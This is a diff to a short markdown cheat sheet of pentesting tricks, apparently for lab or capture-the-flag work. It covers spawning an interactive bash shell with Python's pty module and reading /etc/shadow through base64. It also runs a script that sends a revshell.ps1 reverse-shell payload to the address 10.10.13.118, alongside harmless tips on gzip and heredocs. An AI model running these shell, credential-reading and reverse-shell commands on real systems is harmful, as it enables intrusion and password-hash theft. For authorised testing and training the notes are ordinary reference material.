@@ -13,26 +13,19 @@ Here are some handy tricks to enhance your pentesting workflow:
 ---
 #### Spawn a fully interactive shell:
 ```python
-# Spawn Python shell
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-# Give terminal functions
-export TERM=xterm
-
-# Background the shell
-Ctrl + Z
-
-# Bring shell back to the foreground 
-stty raw -echo; fg
 ```
 #### Read file:
-```
+```python
 xxd -r file.txt 
 base64 /etc/shadow | base64 -d
 ```
 `l\s`: Equivalent to `ls`
 
+#### if command to long
+```python
 python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
+```
 
 #### Decompress a gzip file:
 ```
@@ -41,6 +34,8 @@ gzip -d file.gz
 #### Change file without vim or nano
 ```
 cat > file << EOF 
+....
+EOF
 ```
 
 ---
